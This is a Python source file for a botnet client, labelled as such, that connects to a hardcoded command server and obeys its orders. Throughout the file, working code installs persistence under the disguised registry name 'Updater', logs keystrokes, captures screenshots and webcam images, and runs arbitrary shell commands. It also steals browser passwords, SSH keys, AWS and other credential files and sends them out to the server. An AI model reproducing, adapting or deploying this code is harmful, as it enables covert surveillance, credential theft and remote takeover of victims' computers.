"""
Botnet Client
=================
This file implements a botnet client/agent.
It connects to the central server, listens for commands, and executes them.
Features:
- Keylogger (records keystrokes)
- File upload/download
- Screenshot and webcam capture
- Shell command execution
- Credential stealing (browsers, SSH, AWS, etc.)
- Automatic persistence (adds itself to Windows startup)
"""

import socket
import os
import pyautogui
import subprocess
from datetime import datetime
import time
import sys
import struct
import cv2
import threading
import zipfile
import shutil
import glob
import sqlite3
import base64
from pynput import keyboard

END_RESULT = "<end_of_result>"
SERVER_IP = ("192.168.110.189", 8091)  # <-- CHANGE THIS TO YOUR SERVER IP
CHUNK_SIZE = 2048
EOF_MARKER = "<end_of_file>"
KEYLOG_FILE = "keylog.txt"
STARTUP_NAME = "Updater"

# Persistence: Add client to system startup on Windows
def add_to_startup(entry_name=STARTUP_NAME, file_path=None):
    try:
        import winreg
        if file_path is None:
            file_path = sys.argv[0]
        key = winreg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as open_key:
            winreg.SetValueEx(open_key, entry_name, 0, winreg.REG_SZ, file_path)
    except Exception as e:
        print(f"[!] add_to_startup error: {e}")

# Check if client is set to run on startup
def check_startup(entry_name=STARTUP_NAME):
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_READ) as open_key:
            value, regtype = winreg.QueryValueEx(open_key, entry_name)
            if os.path.exists(value):
                return f"Startup entry exists and file found: {value}\n{END_RESULT}"
            else:
                return f"Startup entry exists but file NOT found: {value}\n{END_RESULT}"
    except FileNotFoundError:
        return f"No startup entry found for '{entry_name}'.\n{END_RESULT}"
    except Exception as e:
        return f"Error checking startup: {e}\n{END_RESULT}"

# Format keystroke for keylogger
def format_stroke(key):
    try:
        stroke = str(key).replace("'", "")
        if stroke == "Key.space":
            return " "
        elif stroke == "Key.enter":
            return "\n"
        elif stroke == "Key.backspace":
            return "<bc>"
        elif stroke == "Key.esc":
            return " "
        elif stroke.startswith("Key"):
            return ""
        else:
            return stroke
    except Exception:
        return ""

# Keylogger event handler
def on_press(key):
    try:
        with open(KEYLOG_FILE, "a", encoding="utf-8") as file:
            file.write(format_stroke(key))
    except Exception:
        pass

# Keylogger thread: records keystrokes in background
def keylogger_thread():
    now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    with open(KEYLOG_FILE, "a", encoding="utf-8") as file:
        file.write(f"\n[{now}]\n")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Send keylog data to server
def send_keylog(client_socket):
    try:
        if not os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, "w", encoding="utf-8"):
                pass
        with open(KEYLOG_FILE, "r", encoding="utf-8") as f:
            data = f.read()
        client_socket.sendall(data.encode("utf-8") + EOF_MARKER.encode())
        open(KEYLOG_FILE, "w", encoding="utf-8").close()
    except Exception as e:
        try:
            client_socket.sendall(f"Keylog error: {e}\n{END_RESULT}".encode())
        except Exception:
            pass

# Receive file from server (upload)
def receive_file(client_socket, filename):
    try:
        client_socket.sendall("READY".encode())
        with open(filename, "wb") as f:
            while True:
                chunk = client_socket.recv(CHUNK_SIZE)
                if chunk.endswith(EOF_MARKER.encode()):
                    f.write(chunk[:-len(EOF_MARKER)])
                    break
                f.write(chunk)
        client_socket.sendall(f"File '{filename}' received and saved.\n{END_RESULT}".encode())
    except Exception as e:
        client_socket.sendall(f"Failed to receive file '{filename}': {e}\n{END_RESULT}".encode())

# Send file to server (download)
def send_file(client_socket, filepath):
    try:
        if os.path.exists(filepath) and os.path.isfile(filepath):
            client_socket.sendall("READY".encode())
            time.sleep(0.5)
            with open(filepath, "rb") as file:
                while True:
                    chunk = file.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    client_socket.sendall(chunk)
                client_socket.sendall(EOF_MARKER.encode())
        else:
            client_socket.sendall("NOFILE".encode())
    except Exception:
        try:
            client_socket.sendall("NOFILE".encode())
        except Exception:
            pass

# Take and send screenshot to server
def send_screenshot(client_socket):
    try:
        now = datetime.now().strftime("%m-%d-%Y-%H.%M.%S")
        filename = now + '.png'
        try:
            screenshot_path = os.path.join(os.getcwd(), filename)
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
        except Exception:
            try:
                home_dir = os.path.expanduser("~")
                screenshot_path = os.path.join(home_dir, filename)
                screenshot = pyautogui.screenshot()
                screenshot.save(screenshot_path)
            except Exception:
                client_socket.sendall("no".encode())
                return
        client_socket.sendall(filename.encode())
        if os.path.exists(screenshot_path):
            client_socket.sendall("yes".encode())
        else:
            client_socket.sendall("no".encode())
            return
        client_socket.recv(1024)
        with open(screenshot_path, "rb") as file:
            while True:
                chunk = file.read(CHUNK_SIZE)
                if not chunk:
                    break
                client_socket.sendall(chunk)
            client_socket.sendall(EOF_MARKER.encode())
        os.remove(screenshot_path)
    except Exception:
        try:
            client_socket.sendall("no".encode())
        except Exception:
            pass

# Capture and send webcam image to server
def send_webcam_image(client_socket):
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            client_socket.sendall(struct.pack('<Q', 0))
            cam.release()
            return
        ret, frame = cam.read()
        cam.release()
        if not ret:
            client_socket.sendall(struct.pack('<Q', 0))
            return
        success, img_encoded = cv2.imencode('.jpg', frame)
        if not success:
            client_socket.sendall(struct.pack('<Q', 0))
            return
        img_bytes = img_encoded.tobytes()
        client_socket.sendall(struct.pack('<Q', len(img_bytes)))
        client_socket.sendall(img_bytes)
    except Exception:
        try:
            client_socket.sendall(struct.pack('<Q', 0))
        except Exception:
            pass

# Execute a shell command and return its output
def execute_command(command):
    try:
        if os.name == "nt":
            proc = subprocess.Popen([
                "powershell.exe", command
            ], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
        stdout, stderr = proc.communicate()
        stdout = stdout.decode("utf-8", errors="ignore")
        stderr = stderr.decode("utf-8", errors="ignore")
        output = stdout if not stderr.strip() else stderr
        return output + "\n" + END_RESULT
    except Exception as e:
        return f"Command execution failed: {e}\n{END_RESULT}"

# Change drive (Windows)
def change_drive(command):
    try:
        drive = command.upper()
        if os.name == 'nt' and len(drive) == 2 and drive[1] == ":":
            os.chdir(drive + "\\")
            return f"Changed to {os.getcwd()}\n{END_RESULT}"
        else:
            return f"Invalid drive command.\n{END_RESULT}"
    except Exception as e:
        return f"Failed to change drive: {e}\n{END_RESULT}"

# Change directory
def change_directory(path):
    try:
        os.chdir(path)
        return f"Changed directory to {os.getcwd()}\n{END_RESULT}"
    except Exception as e:
        return f"Failed to change directory: {e}\n{END_RESULT}"

# Print working directory
def pwd_command():
    try:
        return f"{os.getcwd()}\n{END_RESULT}"
    except Exception as e:
        return f"pwd error: {e}\n{END_RESULT}"

# Make directory
def mkdir_command(dirname):
    try:
        os.makedirs(dirname, exist_ok=True)
        return f"Directory '{dirname}' created (or already exists).\n{END_RESULT}"
    except Exception as e:
        return f"Failed to create directory '{dirname}': {e}\n{END_RESULT}"

# Touch (create/update) file
def touch_command(filename):
    try:
        with open(filename, "a", encoding="utf-8"):
            os.utime(filename, None)
        return f"File '{filename}' touched (created or updated).\n{END_RESULT}"
    except Exception as e:
        return f"Failed to touch file '{filename}': {e}\n{END_RESULT}"

# Write quick text to file
def write_file_quick(command):
    try:
        parts = command.split(" ", 2)
        if len(parts) < 3:
            return "Usage: write <filename> <content>\n" + END_RESULT
        filename, content = parts[1], parts[2]
        with open(filename, "a", encoding="utf-8") as f:
            f.write(content + "\n")
        return f"Text written to '{filename}' successfully.\n{END_RESULT}"
    except Exception as e:
        return f"Failed to write to file '{filename}': {e}\n{END_RESULT}"

# Delete file or directory
def delete_path(target):
    try:
        if os.path.isfile(target):
            os.remove(target)
            return f"File '{target}' deleted.\n{END_RESULT}"
        elif os.path.isdir(target):
            shutil.rmtree(target)
            return f"Directory '{target}' deleted.\n{END_RESULT}"
        else:
            return f"'{target}' not found.\n{END_RESULT}"
    except Exception as e:
        return f"Failed to delete '{target}': {e}\n{END_RESULT}"

# Credential stealing (Chrome, Edge, SSH, AWS, etc.)
def steal_creds_zip(zipname="stolen_creds.zip"):
    to_zip = []
    base = os.path.expanduser("~")
    # Chrome and Edge browser password extraction (Windows)
    if os.name == "nt":
        chrome_login_db = os.path.join(base, r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
        edge_login_db = os.path.join(base, r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data")
        for db_path, browser in [(chrome_login_db, "chrome"), (edge_login_db, "edge")]:
            if os.path.exists(db_path):
                try:
                    temp_db = db_path + ".tmp"
                    shutil.copy(db_path, temp_db)
                    con = sqlite3.connect(temp_db)
                    cur = con.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    rows = cur.fetchall()
                    txt_path = f"{browser}_passwords.txt"
                    with open(txt_path, "w", encoding="utf-8") as f:
                        for row in rows:
                            url, user, pwd = row
                            try:
                                import win32crypt
                                decrypted = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1] if pwd else b""
                                pwd_str = decrypted.decode("utf-8", errors="ignore")
                            except Exception:
                                pwd_str = base64.b64encode(pwd).decode("utf-8") if pwd else ""
                            f.write(f"{url}\t{user}\t{pwd_str}\n")
                    to_zip.append(txt_path)
                    con.close()
                    os.remove(temp_db)
                except Exception as e:
                    with open(f"{browser}_error.txt", "w", encoding="utf-8") as ferr:
                        ferr.write(f"Failed to extract {browser} passwords: {e}\n")
                    to_zip.append(f"{browser}_error.txt")
    # SSH keys
    ssh_dir = os.path.join(base, ".ssh")
    if os.path.exists(ssh_dir):
        for f in glob.glob(os.path.join(ssh_dir, "*")):
            if os.path.isfile(f):
                to_zip.append(f)
    # AWS and other credentials
    for root, dirs, files in os.walk(base):
        for name in files:
            if name.lower() in ["aws_credentials", "credentials", ".env", ".git-credentials"]:
                try:
                    p = os.path.join(root, name)
                    to_zip.append(p)
                except Exception:
                    pass
    if not to_zip:
        return None
    zip_path = os.path.join(os.getcwd(), zipname)
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            for f in to_zip:
                try:
                    archive.write(f, arcname=os.path.basename(f))
                except Exception:
                    pass
        return zip_path
    except Exception:
        return None

# Send stolen credentials ZIP file to server
def send_creds_zip(client_socket):
    zip_path = steal_creds_zip()
    if not zip_path or not os.path.exists(zip_path):
        client_socket.sendall("NO_CREDS".encode())
        return
    try:
        client_socket.sendall("READY".encode())
        time.sleep(0.5)
        with open(zip_path, "rb") as file:
            while True:
                chunk = file.read(CHUNK_SIZE)
                if not chunk:
                    break
                client_socket.sendall(chunk)
            client_socket.sendall(EOF_MARKER.encode())
        os.remove(zip_path)
    except Exception:
        try:
            client_socket.sendall("NO_CREDS".encode())
        except Exception:
            pass

# Main loop: connect to server, listen for commands, execute
def main():
    add_to_startup()
    if not os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, "w", encoding="utf-8"):
            pass
    threading.Thread(target=keylogger_thread, daemon=True).start()
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("Connecting to server...")
            client_socket.connect(SERVER_IP)
            print("Connected.")
            while True:
                try:
                    server_command = client_socket.recv(1024)
                    if not server_command:
                        break
                    command = server_command.decode(errors="ignore").strip()
                    if command.lower() in ("exit", "stop"):
                        client_socket.close()
                        sys.exit(0)
                    elif command.lower() == "get_keylog":
                        send_keylog(client_socket)
                    elif command.lower() == "check_startup":
                        result = check_startup()
                        client_socket.sendall(result.encode())
                    elif command.lower() == "pwd":
                        result = pwd_command()
                        client_socket.sendall(result.encode())
                    elif command.startswith("upload "):
                        filename = command[len("upload "):].strip()
                        receive_file(client_socket, filename)
                    elif len(command) == 2 and command[1] == ":":
                        msg = change_drive(command)
                        client_socket.sendall(msg.encode())
                    elif command.startswith("cd "):
                        path = command[3:].strip()
                        msg = change_directory(path)
                        client_socket.sendall(msg.encode())
                    elif command.startswith("download"):
                        file_path = command[len("download"):].strip()
                        send_file(client_socket, file_path)
                    elif command == "screenshot":
                        send_screenshot(client_socket)
                    elif command == "webcam_snap":
                        send_webcam_image(client_socket)
                    elif command == "steal_creds":
                        send_creds_zip(client_socket)
                    elif command.startswith("mkdir "):
                        dirname = command[len("mkdir "):].strip()
                        msg = mkdir_command(dirname)
                        client_socket.sendall(msg.encode())
                    elif command.startswith("touch "):
                        filename = command[len("touch "):].strip()
                        msg = touch_command(filename)
                        client_socket.sendall(msg.encode())
                    elif command.startswith("write "):
                        msg = write_file_quick(command)
                        client_socket.sendall(msg.encode())
                    elif command.startswith("delete "):
                        target = command[len("delete "):].strip()
                        msg = delete_path(target)
                        client_socket.sendall(msg.encode())
                    else:
                        output = execute_command(command)
                        client_socket.sendall(output.encode("utf-8"))
                except Exception as e:
                    try:
                        client_socket.sendall(f"Client error: {e}\n{END_RESULT}".encode())
                    except Exception:
                        pass
                    break
        except Exception as e:
            print(f"[!] Main connection loop error: {e}")
            time.sleep(4)

# Start client main loop
if __name__ == "__main__":
    main()